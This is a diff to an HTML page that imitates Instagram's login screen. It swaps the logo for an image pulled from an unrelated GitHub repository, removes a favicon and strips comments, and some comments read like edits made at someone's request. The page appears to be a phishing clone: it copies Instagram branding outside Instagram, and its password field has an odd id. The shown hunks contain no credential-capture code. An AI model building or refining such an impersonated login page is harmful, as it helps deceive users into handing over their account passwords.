@@ -5,7 +5,6 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Login • Instagram</title>
-    <link rel="shortcut icon" href="img/Instagram_logo_2016.svg.webp">
     <style>
         body {
           background-color: #000000; /* Dark mode background */
@@ -90,9 +89,8 @@
 
         .heading {
           margin: 22px auto 30px auto;
-          /* Integrated your exact custom image URL link below */
-          background-image: url("https://cdn.phototourl.com/free/2026-06-14-a16edf6b-c219-49a6-b634-73b614af5eb5.png");
-          filter: invert(1); /* Turns the black script logo white for dark mode */
+          /* Only using the requested single GitHub asset with NO color inversions */
+          background-image: url("https://raw.githubusercontent.com/usernsme-yay/hehehjakan/refs/heads/main/IMG_7139.png");
           background-size: contain;
           background-repeat: no-repeat;
           background-position: center;
@@ -223,7 +221,7 @@
           font-weight: 600;
           font-size: 14px;
           color: #ffffff;
-          display: none; /* Handled dynamically via JavaScript toggle logic */
+          display: none;
         }
     </style>
 </head>
@@ -266,12 +264,10 @@
     </div>
 
     <script>
-        // Smoothly drop the overlay spinner when operational setup completely finishes rendering
         window.addEventListener('load', function () {
             document.body.classList.add('loaded');
         });
 
-        // Interactive visibility toggle processing loops
         const showPasswordBtn = document.getElementById('show-password-btn');
         const passwordField = document.getElementById('message');
 
